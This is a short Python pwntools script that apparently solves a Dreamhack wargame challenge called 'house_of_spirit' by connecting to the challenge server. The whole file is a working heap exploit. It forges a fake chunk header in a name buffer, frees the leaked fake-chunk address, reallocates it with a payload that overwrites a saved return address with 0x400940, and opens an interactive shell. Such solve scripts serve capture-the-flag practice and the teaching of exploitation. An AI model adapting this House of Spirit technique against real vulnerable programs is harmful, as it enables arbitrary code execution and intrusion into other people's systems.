from pwn import *

context.log_level = "debug"

#r = process("./house_of_spirit")
r = remote('host3.dreamhack.games', 19926)

def create(size, data):
    r.sendlineafter(b"> ", b'1')
    r.sendlineafter(b"Size: ", str(size).encode())
    r.sendafter(b"Data: ", data)

def delete(free_address):
    r.sendlineafter(b"> ", b'2')
    r.sendlineafter(b": ", str(free_address).encode())

def exit_func():
    r.sendlineafter(b"> ", b'3')

input()

r.sendafter(b": ", p64(0) + p64(0x101))

name = int(r.recvuntil(b":")[:-1], 16)
fake_chunk_addr = name + 0x10
print("name:", hex(name))

delete(fake_chunk_addr)

payload = b'a' * 0x28 + p64(0x400940)

create(0xf0, payload)

exit_func()

r.interactive()
